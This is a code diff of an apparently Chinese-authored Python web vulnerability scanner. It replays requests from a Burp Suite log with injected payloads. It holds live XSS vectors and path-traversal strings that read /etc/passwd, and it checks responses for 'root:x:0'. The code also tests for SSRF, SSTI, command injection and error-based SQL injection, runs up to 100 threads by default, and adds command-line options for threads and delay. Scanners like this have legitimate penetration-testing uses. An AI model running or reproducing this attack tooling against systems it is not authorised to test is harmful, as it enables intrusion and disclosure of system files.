@@ -11,10 +11,12 @@ import json
 import base64
 import time
 import sys
+import argparse
 from AutoSqli import AutoSqli
 import logging
 from Queue import Queue
 from colorama import *
+from classSQL import *
 
 """
 根据网络上的一些脚本，自己改了一下
@@ -39,13 +41,18 @@ XSS_Rule = {
         "\" onfous=alert(document.domain)\"><\"",
         "\"`'></textarea><audio/onloadstart=confirm`1` src>",
         "\"</script><svg onload=alert`1`>",
-        "../../../../../../../../../../etc/passwd",
-        "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
-        "../../../../../../../../../../etc/passwd%00",
+        # "../../../../../../../../../../etc/passwd",
+        # "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
+        # "../../../../../../../../../../etc/passwd%00",
         #"././././././././././././././././././././././././../../../../../../../../etc/passwd",
         #";alert(1)//"
         #"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        #"\"`'></textarea><audio/onloadstart=confirm`1` src>",
+        "\"`'></textarea><audio/onloadstart=confirm`1` src>",
+    ],
+    "lfi": [
+        "../../../../../../../../../../etc/passwd",
+        "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
+        "../../../../../../../../../../etc/passwd%00",
     ],
     # URL跳转与SSRF
     "redirect" : [
@@ -183,13 +190,17 @@ def _init_get_url(url_group,rules,inqueue):
             uquery = url_node.query
             # 对于无参数的请求，直接将文件包含的payload放在路径后边
             if not uquery:
-                for rule_item in rules.keys():
-                # 添加属于ssrf/URL跳转的规则,
-                    for _rule in rules[rule_item]:
-                        if 'passwd' in _rule:
-                            if not _url_item.endswith("/"):
-                                _url_item = _url_item + "/"
-                            inqueue.put({'action': _url_item + _rule, 'input': None, 'method': 'get', 'regex': _rule, 'headers': headers, 'type': 'lfi'})
+                for _rule in rules['lfi']:
+                    if not _url_item.endswith("/"):
+                        _url_item = _url_item + "/"
+                    inqueue.put({'action': _url_item + _rule, 'input': None, 'method': 'get', 'regex': "root:x:0", 'headers': headers, 'type': 'lfi'})
+                # for rule_item in rules.keys():
+                # # 添加属于ssrf/URL跳转的规则,
+                #     for _rule in rules[rule_item]:
+                #         if 'passwd' in _rule:
+                #             if not _url_item.endswith("/"):
+                #                 _url_item = _url_item + "/"
+                #             inqueue.put({'action': _url_item + _rule, 'input': None, 'method': 'get', 'regex': _rule, 'headers': headers, 'type': 'lfi'})
 
                 continue
             url_parse = _url_item.replace('?'+uquery, '')
@@ -205,30 +216,36 @@ def _init_get_url(url_group,rules,inqueue):
                             # remove the last = or == in base64 encode
                             domain = domain.rstrip('=')
                             _rule = _rule.replace('{domain}', domain)
+                        # if rule_item == "lfi":
+
 
                         tmp_dict[parameter_item] = _rule
                         tmp_qs = urllib.unquote(urllib.urlencode(tmp_dict)).replace('+','%20')
+                        if "lfi" == rule_item:
+                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': "root:x:0", 'headers': headers, 'type': 'lfi'})
                         if 'usr' in _rule:
-                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex':_rule, 'headers': headers, 'type': 'usr'})
+                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'usr'})
                         elif 'nslookup' in _rule:
-                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex':_rule, 'headers': headers, 'type': 'cli'})
+                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'cli'})
                         elif "1357924680" in _rule:
                             inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': '3351376549499229720',  'headers': headers, 'type': 'ssti'})
                         else:
-                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex':_rule, 'headers': headers, 'type': 'xss'})
+                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'xss'})
 
 
 
 
 class detectXSS(threading.Thread):
     """docstring for detectXSS"""
-    def __init__(self, inqueue, outqueue):
+    def __init__(self, inqueue, outqueue, delay):
         threading.Thread.__init__(self)
         self.inqueue =  inqueue
         self.outqueue = outqueue
+        self.delay = delay
 
     def run(self):
         while True:
+            time.sleep(self.delay)
             if self.inqueue.empty():
                 break
             try:
@@ -254,14 +271,16 @@ class detectXSS(threading.Thread):
     def request_do(self, url, _data, _regex, headers, type):
         TIMEOUT=5
         _bool = False
+        """
         if "Connection" in headers:
             if headers["Connection"] == "close":
                 pass
             else:
-
                 headers["Connection"] = "close"
         else:
             headers["Connection"] = "close"
+        """
+        headers['Connection'] = "close"
         #if type == 'ssrf':
         #    logging.info("[-] Dealing type: {}".format(type))
         #logging.info("[-] Requesting " + url)
@@ -270,7 +289,7 @@ class detectXSS(threading.Thread):
                 if type == 'imagemagick':
                     for name in ['imgFile', 'imgSrc', 'file', 'fileField']:
                         files = {name : ('image.png', _data, 'image/png')}
-                        req = requests.post(url, headers=headers, files=files, verify=False)
+                        req = requests.post(url, headers=headers, files=files, verify=False, timeout=TIMEOUT)
                         # global flag 
                         # flag = True
                 else:
@@ -295,12 +314,16 @@ class detectXSS(threading.Thread):
                 return _bool
             req_result = ''.join(req.content.split('\n'))
 
-            if "passwd" in _regex:
-                if req_result.find('root:x:') > 0:
-                    _bool=True
-
-            elif req_result.find(_regex) != -1:
+            if req_result.find(_regex) > 0:
                 _bool = True
+            
+            # return _bool
+            # if "passwd" in _regex:
+            #     if req_result.find('root:x:') > 0:
+            #         _bool=True
+
+            # elif req_result.find(_regex) != -1:
+            #     _bool = True
         except Exception, e:
             logging.error("[!!] [request_do]\t" + str(e))
             return _bool
@@ -330,13 +353,11 @@ def autoSqli(dict_result):
 
 
 
-if __name__ == '__main__':
-    Usage = "python %s target_log" %(sys.argv[0])
 
-    if len(sys.argv) != 2:
-        print Usage
-        sys.exit(0)
-    filename = sys.argv[1]
+def start_point(args):
+    filename = args.file
+    threadNum = args.threads
+    delay = args.delay
     inqueue = Queue()
     outqueue = Queue()
     # 增加文件是否存在的校验
@@ -362,8 +383,8 @@ if __name__ == '__main__':
     time.sleep(3)
     threads = []
     # 30个线程来跑
-    for i in xrange(100):
-        thd = detectXSS(inqueue, outqueue)
+    for i in xrange(threadNum):
+        thd = detectXSS(inqueue, outqueue, delay)
         #thd.setDaemon(True)
         threads.append(thd)
 
@@ -373,22 +394,99 @@ if __name__ == '__main__':
     for thd in threads:
         if thd.is_alive():
             thd.join()
-    """
-    count = 0
-    # 最高30分钟?
-    while True:
-        for thd in threads:
-            if thd.is_alive():
-                time.sleep(1)
-            else:
-                count += 1
-        if count == 30:
-            break
-    """
 
-    # 输出outqueue的内容
     while not outqueue.empty():
         print "[+] [GET]:\t" + Fore.GREEN + outqueue.get() + Style.RESET_ALL
 
-    print "[-][-] Done!"
+    # print "[-][-] Done!"
+    # use classSQL to scan the error-based sqli 
+    for index in dict_result.keys():
+        item = dict_result[index]
+        url = item['url']
+        headers = item['headers']
+        data = item['data'] if 'data' in item else None
+        time.sleep(3)
+        aim_error_list = sqli_test(url, headers, data)
+        for i in aim_error_list:
+            print "[+] [{}]:\t".format(i[0]) + Fore.GREEN + "Found SQLi Error-Based Injection=> url:{} =>data:{}".format(i[1], i[2])  + Style.RESET_ALL
+
+
+
+def parse_arg():
+    parser =  argparse.ArgumentParser()
+    parser.add_argument("-t", "--threads", type=int, default=100, help="the threads num, default is 100")
+    parser.add_argument("-d", "--delay", type=int, default=0, help="the delay of each request, default is 0")
+    parser.add_argument("file",  help="the burpsuite log file")
+    args = parser.parse_args()
+    # if args.port is None or args.host is None:
+    #     parser.print_usage()
+    #     exit(0)
+    # else:
+    return args
+
+if __name__ == '__main__':
+    Usage = "python %s target_log" %(sys.argv[0])
+
+    try:
+        args = parse_arg()
+    except:
+        print Usage
+        exit(0)
+    
+
+    # filename = sys.argv[1]
+    # inqueue = Queue()
+    # outqueue = Queue()
+    # # 增加文件是否存在的校验
+    # dict_result = getLinks(filename)
+    # # sys.exit(0)
+    # # 将action结尾的URL放入同一个URL，这样以后再出现struts漏洞时，就可以用的上了
+    # with open("action.lst", "a") as f:
+    #     for i in dict_result.keys():
+    #         _ = urlparse.urlparse(dict_result[i]["url"])
+    #         if "action" in _.path or "do" in _.path:
+    #             f.write(dict_result[i]["url"] + "\n")
+
+
+    # #print dict_result
+    # #with open("test.json", "w") as f:
+    # #    json.dump(dict_result.encode("utf-8"), f)
+    # # 对所有请求都POST到SQLMAPAPI中去
+    # #autoSqli(dict_result)
+    # #sys.exit(0)
+    # # XSS/LFI scan
+    # _init_get_url(dict_result, XSS_Rule, inqueue)
+    # logging.info("[-] Totally {0} requests".format(inqueue.qsize()))
+    # time.sleep(3)
+    # threads = []
+    # # 30个线程来跑
+    # for i in xrange(100):
+    #     thd = detectXSS(inqueue, outqueue)
+    #     #thd.setDaemon(True)
+    #     threads.append(thd)
+
+    # for thd in threads:
+    #     thd.start()
+
+    # for thd in threads:
+    #     if thd.is_alive():
+    #         thd.join()
+    # """
+    # count = 0
+    # # 最高30分钟?
+    # while True:
+    #     for thd in threads:
+    #         if thd.is_alive():
+    #             time.sleep(1)
+    #         else:
+    #             count += 1
+    #     if count == 30:
+    #         break
+    # """
+
+    # # 输出outqueue的内容
+    # while not outqueue.empty():
+    #     print "[+] [GET]:\t" + Fore.GREEN + outqueue.get() + Style.RESET_ALL
+
+    # print "[-][-] Done!"
 
